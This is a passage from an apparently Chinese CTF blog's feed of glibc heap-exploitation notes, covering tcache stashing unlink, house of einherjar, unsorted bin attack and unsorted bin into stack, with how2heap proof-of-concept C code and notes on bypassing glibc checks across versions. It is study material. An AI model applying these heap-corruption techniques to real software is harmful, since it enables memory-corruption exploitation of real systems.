<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)&#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><span class="hljs-comment">//填满tcache</span><br><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(prev);<br><span class="hljs-comment">//a，prev合并成一个0x220的chunk进入unsorted bin，为prev的地址</span><br>    <br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>    <span class="hljs-built_in">free</span>(a);<br><span class="hljs-comment">//a同时位于tcache和unsorted bin</span><br><br>    <span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x120</span>);<br><span class="hljs-comment">//从prev切割一块0x130的chunk，可以控制a的fd</span><br><br>    b[<span class="hljs-number">0x120</span>/<span class="hljs-number">8</span><span class="hljs-number">-2</span>] = (<span class="hljs-type">long</span>)stack_var;<br><span class="hljs-comment">//更改a的fd</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <span class="hljs-type">intptr_t</span> *c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>    <br>    assert(c==stack_var);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-32以后-1"><a href="#2-32以后-1" class="headerlink" title="2.32以后"></a>2.32以后</h2><p>注意safe-linking机制</p><h1 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br><br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<br><span class="hljs-comment">//tcache中填6个chunk</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<br><span class="hljs-comment">//填满tcache</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<br><span class="hljs-comment">//0和2进入unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<br><br><span class="hljs-comment">//0和2进入small bin</span><br><span class="hljs-comment">//small bin-&gt;2-&gt;0</span><br><span class="hljs-comment">//small bin中的两个chunk也可以通过切割last remainder+calloc实现</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">// size &gt; 0x90</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><span class="hljs-comment">//从tcache中取两个，现在tcache中有五个chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br><br><span class="hljs-comment">//更改2的bk为stack_var</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<br><span class="hljs-comment">//从small bin中拿出0（calloc不从tcache中取chunk）</span><br><span class="hljs-comment">//将2和stack_var放进tcache</span><br><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);  <br><span class="hljs-comment">//从tcache中取出stack_var </span><br><br>    assert(target == &amp;stack_var[<span class="hljs-number">2</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h1><p>2.26-2.28版本tcache没有double free的检查，可以随便double free</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of einherjar</title>
    <link href="/2023/02/06/house-of-einherjar/"/>
    <url>/2023/02/06/house-of-einherjar/</url>
    
    <content type="html"><![CDATA[<p>很大胆的利用方式，有被吓到(*Φ皿Φ*)</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>如果程序存在of by null漏洞且能泄露堆地址的话就能使用这个方法</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-25以前"><a href="#2-25以前" class="headerlink" title="2.25以前"></a>2.25以前</h2><p>实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br><span class="hljs-type">uint8_t</span>* a;<br><span class="hljs-type">uint8_t</span>* b;<br><span class="hljs-type">uint8_t</span>* d;<br><br>a = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br><span class="hljs-type">int</span> real_a_size = malloc_usable_size(a);<br><span class="hljs-type">size_t</span> fake_chunk[<span class="hljs-number">6</span>];<br><br>fake_chunk[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//not used</span><br>fake_chunk[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment">//not used now</span><br>fake_chunk[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// fwd</span><br>fake_chunk[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">// bck</span><br>fake_chunk[<span class="hljs-number">4</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//fwd_nextsize</span><br>fake_chunk[<span class="hljs-number">5</span>] = (<span class="hljs-type">size_t</span>) fake_chunk; <span class="hljs-comment">//bck_nextsize</span><br><br>b = (<span class="hljs-type">uint8_t</span>*) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br><span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br><br><span class="hljs-type">uint64_t</span>* b_size_ptr = (<span class="hljs-type">uint64_t</span>*)(b - <span class="hljs-number">8</span>);<br><br>a[real_a_size] = <span class="hljs-number">0</span>; <br><br><span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((b-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)*<span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*)fake_chunk);<br>*(<span class="hljs-type">size_t</span>*)&amp;a[real_a_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>fake_chunk[<span class="hljs-number">1</span>] = fake_size;<br><br><span class="hljs-built_in">free</span>(b);<br>d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>malloc一个chunk（a）用于控制下一个申请的chunk（b）的presize和preinuse位</li><li>伪造fake chunk的fd、bk、fd_nextsize和bk_nextsize绕过unlink的检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c">FD = P-&gt;fd;      \<br>BK = P-&gt;bk;      \<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))      \<br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \<br><br>……<br><br><span class="hljs-keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="hljs-number">0</span>)      \<br>|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="hljs-number">0</span>))    \<br>malloc_printerr (check_action,      \<br><span class="hljs-string">&quot;corrupted double-linked list (not small)&quot;</span>,    \<br>P, AV);      \<br></code></pre></td></tr></table></figure></li><li>malloc一个unsorted bin范围的chunk（b），用于触发向下合并</li><li>a[real_a_size] &#x3D; 0利用of by null修改b的preinuse位，在free(b)的时候触发向下合并</li><li>计算从b到fake chunk的偏移，减去的0x10是b的size和presize</li><li>修改b的presize为fake_size</li><li>修改fake chunk的size为fake_size（不改也行，这个版本没检查）</li><li>free(b)触发向下合并</li><li>再申请chunk的时候就会从合并的chunk里切割</li></ul><h2 id="2-26-2-28"><a href="#2-26-2-28" class="headerlink" title="2.26-2.28"></a>2.26-2.28</h2><ul><li>有了tcache，申请的chunk要在tcache的范围外</li><li>2.26unlink增加了检查<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="hljs-meta"><span class="hljs-comment">//size和next chunk的presize的检查</span></span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="hljs-number">0</span>))      \<br>      malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted size vs. prev_size&quot;</span>, P, AV);  \<br>    FD = P-&gt;fd;      \<br>    BK = P-&gt;bk;      \<br><br>……<br><br>&#125;<br></code></pre></td></tr></table></figure>要伪造fake chunk的size</li></ul><h2 id="2-29-2-31"><a href="#2-29-2-31" class="headerlink" title="2.29-2.31"></a>2.29-2.31</h2><p>2.29增加了对top chunk的size的合法性检查，由于b在向下合并后还会向上合并，这就必然导致top chunk的size不合法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">use_top:<br><br>  victim = av-&gt;top;<br>  size = chunksize (victim);<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &gt; av-&gt;system_mem))<br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted top size&quot;</span>);<br></code></pre></td></tr></table></figure><p>可以通过在free(b)前再malloc随便一个chunk来防止和top chunk合并，但这样还是会触发另一个检查<br>2.29_int_malloc遍历unsorted bin的时候还增加了对chunk的size的合法性的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt;= <span class="hljs-number">2</span> * SIZE_SZ)<br>    || __glibc_unlikely (size &gt; av-&gt;system_mem))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): invalid size (unsorted)&quot;</span>);<br></code></pre></td></tr></table></figure><p>因此我们需要一种全新的利用方法，实验代码如下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-type">intptr_t</span> stack_var[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x38</span>);<br><br>    a[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-comment">// prev_size (Not Used)</span><br>    a[<span class="hljs-number">1</span>] = <span class="hljs-number">0x60</span>; <span class="hljs-comment">// size</span><br>    a[<span class="hljs-number">2</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// fwd</span><br>    a[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>) a; <span class="hljs-comment">// bck</span><br><br>    <span class="hljs-type">uint8_t</span> *b = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-type">int</span> real_b_size = malloc_usable_size(b);<br>    <span class="hljs-type">uint8_t</span> *c = (<span class="hljs-type">uint8_t</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    <span class="hljs-type">uint64_t</span>* c_size_ptr = (<span class="hljs-type">uint64_t</span>*)(c - <span class="hljs-number">8</span>);<br><br>    b[real_b_size] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-type">size_t</span> fake_size = (<span class="hljs-type">size_t</span>)((c - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>) * <span class="hljs-number">2</span>) - (<span class="hljs-type">uint8_t</span>*) a);<br>    *(<span class="hljs-type">size_t</span>*) &amp;b[real_b_size-<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">size_t</span>)] = fake_size;<br><br>    a[<span class="hljs-number">1</span>] = fake_size;<br><br>    <span class="hljs-type">intptr_t</span> *x[<span class="hljs-number">7</span>];<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        x[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xf8</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-keyword">sizeof</span>(x)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">intptr_t</span>*); i++) &#123;<br>        <span class="hljs-built_in">free</span>(x[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">free</span>(c);<br><br>    <span class="hljs-type">intptr_t</span> *d = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x158</span>);<br>    <span class="hljs-type">uint8_t</span> *pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-built_in">free</span>(pad);<br>    <span class="hljs-built_in">free</span>(b);<br><br>    d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>) stack_var;<br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <br>    <span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br><br>    <span class="hljs-comment">// sanity check</span><br>    assert(e == stack_var);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>先申请a（0x40）、b（0x30）和c（0x100）三个chunk，填满tcache，再将然后free(c)利用of by null漏洞形成堆块重叠，如示意图所示：<img src="/2023/02/06/house-of-einherjar/1.jpg" class title="步骤一"></li><li>malloc回c，然后再malloc一个0x28的chunk然后free绕过tcache的count检查</li><li>free(b)，b进入tcache，通过d改变b的fd指向stack_var，再申请两个chunk就能控制stack_var</li></ul><h2 id="2-32以上"><a href="#2-32以上" class="headerlink" title="2.32以上"></a>2.32以上</h2><p>实验代码多了这么一步：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">0x10</span>; i++) &#123;<br><span class="hljs-keyword">if</span>(((<span class="hljs-type">long</span>)&amp;stack_var[i] &amp; <span class="hljs-number">0xf</span>) == <span class="hljs-number">0</span>) &#123;<br>target = &amp;stack_var[i];<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为2.32增加了chunk地址对齐0x10的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br></code></pre></td></tr></table></figure><p>还改了这一步</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">d[<span class="hljs-number">0x30</span> / <span class="hljs-number">8</span>] = (<span class="hljs-type">long</span>)target ^ ((<span class="hljs-type">long</span>)&amp;d[<span class="hljs-number">0x30</span>/<span class="hljs-number">8</span>] &gt;&gt; <span class="hljs-number">12</span>);<br></code></pre></td></tr></table></figure><p>因为2.32增加了safe-linking机制</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsorted bin attack</title>
    <link href="/2023/02/06/unsorted-bin-attack/"/>
    <url>/2023/02/06/unsorted-bin-attack/</url>
    
    <content type="html"><![CDATA[<p>史无前例简短的实验代码(ˉ▽ˉ；)…</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>unsorted bin attack利用的是_int_malloc中遍历unsorted bin取下chunk的过程，实现效果为任意地址写unsorted bin的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>2.28增加了对chunk的前后连接的检查机制，这个方法就失效了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br> malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><h2 id="2-26以前"><a href="#2-26以前" class="headerlink" title="2.26以前"></a>2.26以前</h2><p>实验代码入下（来自how2heap）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var=<span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">500</span>);<span class="hljs-comment">//防止合并</span><br><span class="hljs-built_in">free</span>(p);<br>p[<span class="hljs-number">1</span>]=(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var<span class="hljs-number">-2</span>);<br><span class="hljs-comment">//p-&gt;bk=stack_var-0x10</span><br><span class="hljs-comment">//stack_var-0x10-&gt;presize</span><br><span class="hljs-comment">//stack_var-8-&gt;size</span><br><span class="hljs-comment">//stack_var-&gt;fd</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">400</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>malloc(400)的过程中执行了以下步骤：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//victim=p</span><br>bck = victim-&gt;bk;<br><span class="hljs-comment">//bck=p-&gt;bk=stack_var-0x10</span><br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br><span class="hljs-comment">//(stack_var-0x10)-&gt;fd=stack_var=unsorted_chunks(av)</span><br></code></pre></td></tr></table></figure><h2 id="2-26-2-27"><a href="#2-26-2-27" class="headerlink" title="2.26-2.27"></a>2.26-2.27</h2><p>有了tcache，申请的chunk要在tcache的范围外</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Pwn</category>
      
      <category>Heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>how2heap</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unsorted bin into stack</title>
    <link href="/2023/02/06/unsorted-bin-into-stack/"/>
    <url>/2023/02/06/unsorted-bin-into-stack/</url>
    
    <content type="html"><![CDATA[<p>又没有例题(￣、￣)</p><span id="more"></span><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>实现效果为分配chunk到栈上<br>unsorted bin遍历过程中是用bin的bk指针寻找chunk的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br></code></pre></td></tr></table></figure><p>从unsorted bin中摘下chunk的时候有以下寻址，所以victim-&gt;bk得是一个合法地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">bck = victim-&gt;bk;<br>……<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>2.28增加了以下检查，所以要伪造bck的fd指针：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br> malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br></code></pre></td></tr></table></figure><p>2.29增加了next chunk的presize和size、preinuse检查，无法利用了（如果能在栈上找到合法的next chunk倒是能用，但可能性感觉不大）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != 